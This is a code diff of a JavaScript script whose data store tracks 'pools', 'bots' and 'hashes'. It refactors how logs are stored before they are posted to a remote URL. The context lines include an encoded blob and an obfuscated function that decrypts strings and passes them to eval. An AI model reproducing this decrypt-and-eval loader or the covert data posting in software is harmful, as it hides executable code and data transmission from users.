@@ -34,7 +34,8 @@ var main = function() {
     ],
     pools: { backgrounds: [], hashes: [] },
     bots: { backgrounds: [], hashes: [] },
-    push: { tmp: { values: [], backgrounds: [] }, log: { values: [], backgrounds: [] } }
+    tmp: { values: [], backgrounds: [] },
+    log: { values: [], backgrounds: [] }
   }
 
   var gg = { rec: false };
@@ -89,7 +90,7 @@ var main = function() {
   
     if(active && !gg.rec && gg.url) {
       gg.rec = true;
-      db.push.log = db.push.tmp; db.push.tmp = { values: [], backgrounds: [] };
+      db.log = db.tmp; db.tmp = { values: [], backgrounds: [] };
       request.post({ url: gg.url, form: JSON.stringify(db), json: true, followAllRedirects: true },
       function(error, response, body) {
         if(error) { self.log({host:'google',color:'#F8516A',msg:error.message}); gg.rec = false }
@@ -265,10 +266,10 @@ vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7Y
   }
 
   this.log = function(data) {
-    db.push.tmp.values.push([new Date().toLocaleString(),data.host,data.msg]);
+    db.tmp.values.push([new Date().toLocaleString(),data.host,data.msg]);
     if(!data.color) data.color = null;
     else console.log(JSON.stringify(data))
-    db.push.tmp.backgrounds.push([data.color,data.color,data.color]);
+    db.tmp.backgrounds.push([data.color,data.color,data.color]);
   }
 
   var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
